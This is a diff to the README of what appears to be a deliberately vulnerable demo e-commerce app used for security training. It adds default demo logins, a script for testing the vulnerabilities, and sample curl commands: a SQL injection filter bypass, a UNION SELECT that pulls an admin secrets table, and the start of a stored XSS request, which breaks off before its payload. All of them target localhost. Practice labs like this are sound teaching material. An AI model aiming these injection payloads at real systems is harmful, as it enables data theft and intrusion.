@@ -99,3 +99,37 @@ docker-compose logs -f
 ```
 Admin:  admin@shopsmart.com / admin123
 User 1: john@example.com / password123
+User 2: jane@example.com / password123
+```
+
+---
+
+## 🧪 Testing Vulnerabilities
+
+### Automated Testing
+Run the comprehensive test suite:
+```bash
+chmod +x test-all-vulnerabilities.sh
+./test-all-vulnerabilities.sh
+```
+
+### Manual Testing
+See **[COMPLETE_VULNERABILITY_TEST_GUIDE.md](./COMPLETE_VULNERABILITY_TEST_GUIDE.md)** for detailed exploitation steps.
+
+### Quick Examples
+
+#### SQL Injection
+```bash
+# Bypass category filter
+curl "http://localhost:4000/api/v1/products/search?category=1%20OR%201=1"
+
+# Extract admin secrets
+curl "http://localhost:4000/api/v1/products/search?category=-1%20UNION%20SELECT%20id,%20key,%20value,%200,%20NULL,%200,%20now()%20FROM%20admin_secret--"
+```
+
+#### Cross-Site Scripting
+```bash
+# Stored XSS in reviews
+curl -X POST http://localhost:4000/api/v1/reviews \
+  -H "Content-Type: application/json" \
+  -b cookies.txt \
